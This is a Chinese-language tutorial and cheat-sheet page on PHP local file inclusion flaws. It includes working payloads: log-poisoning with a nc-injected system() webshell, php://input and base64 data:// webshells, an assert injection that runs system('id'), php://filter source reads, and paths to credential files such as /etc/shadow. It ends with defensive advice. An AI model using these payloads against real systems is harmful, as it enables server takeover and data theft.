文件包含
========================================

基础
----------------------------------------
文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。

触发Sink
----------------------------------------
- PHP文件包含函数有以下四种
	- include
		- 在包含过程中出错会报错，不影响执行后续语句
	- include_once
		- 仅包含一次
	- require
		- 在包含过程中出错，就会直接退出，不执行后续语句
	- require_once
		- 仅包含一次，出错退出

本地文件包含漏洞 (LFI)
----------------------------------------
本部分仅收录在当前主流PHP环境（7.x/8.x）下仍然有效的技术。

有效技术
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

- 敏感信息路径读取
	利用目录遍历读取系统敏感文件，常用于信息收集。

	Windows系统常见路径
	::

		c:\boot.ini
		c:\windows\php.ini
		c:\ProgramData\mysql\my.ini
		c:\windows\system32\inetsrv\MetaBase.xml

	Linux/Unix系统常见路径
	::

		/etc/passwd
		/etc/shadow
		/etc/hostname
		/etc/apache2/apache2.conf
		/etc/nginx/nginx.conf
		/var/log/apache2/access.log
		/var/log/nginx/access.log
		/proc/self/environ

	可使用字典爆破：https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt

- php://filter 读取源码
	+ 无需任何特殊配置，可读取PHP文件源码（Base64编码），是最稳定的源码获取方式。
		::

			?file=php://filter/convert.base64-encode/resource=index.php
	+ 输出为Base64字符串，解码后得到源码。

- 日志文件包含 (Log Poisoning)
	+ 向Web服务器日志（如Apache或Nginx访问日志）注入PHP代码，然后通过LFI包含日志文件执行代码。
	+ 利用条件：
		- 已知日志物理路径（常见默认路径）
		- 日志文件可读（Web用户有权限）
		- 能发送包含恶意代码的请求（需绕过URL编码，可使用NC或Burp）
	+ 示例：
		::

			# 使用nc发送原始请求注入代码
			nc 192.168.1.100 80
			GET <?php system($_GET['c']); ?> HTTP/1.1
			Host: 192.168.1.100

			# 然后通过LFI包含日志并执行命令
			?file=../../var/log/apache2/access.log&c=id

- Session文件包含
	+ 将恶意代码写入Session文件，然后包含该会话文件执行。
	+ 利用条件：
		- 已知Session存储路径（可通过phpinfo()或默认路径）
		- 存在将用户输入写入Session的代码（如 $_SESSION['var']=$_GET['input']）
		- 能获取到sessionid（通常从Cookie或URL中获取）
	+ Session文件命名格式为 sess_<sessionid>，存储路径常见于 /var/lib/php/session 或 session.save_path 配置。
	+ 示例代码：
		::

			<?php
				session_start();
				$_SESSION["username"] = $_GET['input'];
			?>
	+ 当传入 ?input=<?php phpinfo();?> 后，Session文件内容包含该代码，再通过LFI包含即可执行。

有条件利用的技术
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

- php://input 伪协议
	将POST数据作为包含的文件内容，可执行任意PHP代码。
	条件：php.ini 中 allow_url_include = On（现代PHP默认关闭）
	利用方式：
	::

		GET ?file=php://input
		POST数据：<?php system($_GET['c']); ?>

- data:// 伪协议
	直接内联数据流，可包含Base64编码的PHP代码。
	条件：allow_url_include = On
	示例：
	::

		?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+

- assert 字符串拼接绕过
	当代码使用 assert 对包含路径进行检查时，可尝试闭合引号注入代码。
	示例代码：
	::

		assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");

	若 $file 可控，构造：
	::

		?file=' and die(system('id')) or '

	实际变为 assert("strpos('' and die(system('id')) or '', '..') === false")，从而执行系统命令。
	该场景较少见，但存在于老旧代码或CTF题目中。

绕过技巧
----------------------------------------
- URL编码绕过
	对payload进行多次URL编码，可绕过简单的WAF字符串匹配。

- 绝对路径绕过
	使用绝对路径如 /etc/passwd 替代相对路径，避免目录遍历模式匹配。

- 使用php://filter结合压缩流
	::

		?file=php://filter/convert.base64-encode/resource=/etc/passwd
	
- 有时可绕过关键词过滤。

防御建议
----------------------------------------
- 使用白名单映射，禁止用户直接输入文件路径。
- 使用 realpath() 检查目标文件是否在允许目录内。
- 确保 allow_url_include = Off（现代PHP默认）且不需要时禁用 allow_url_fopen。
- 避免将用户输入写入Session或日志文件。
- 限制日志文件权限，防止Web用户读取。
- 升级至PHP 8.x，移除历史脆弱函数。

参考链接
----------------------------------------
- LFI Cheat Sheet (HighOn.Coffee) https://highon.coffee/blog/lfi-cheat-sheet/
- PHP伪协议官方文档 https://www.php.net/manual/en/wrappers.php
- PayloadsAllTheThings - File Inclusion https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
- 目录遍历字典 https://github.com/xmendez/wfuzz/tree/master/wordlist/vulns